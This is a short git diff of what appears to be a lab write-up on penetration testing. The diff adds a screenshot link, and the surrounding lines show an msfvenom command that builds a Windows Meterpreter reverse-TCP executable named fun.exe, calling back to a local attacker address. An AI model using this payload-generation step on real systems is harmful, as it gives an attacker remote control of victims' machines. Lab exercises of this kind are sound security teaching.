@@ -27,6 +27,8 @@ Find the attackers ip address using ifconfig
 ## OUTPUT:
 
 
+<img width="798" height="612" alt="Screenshot 2026-11-21 084419" src="https://github.com/user-attachments/assets/0d5fbec5-c3e3-4eac-a024-aa9cdbd58db8" />
+
 
 Create a malicious executable file fun.exe using msfvenom command
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
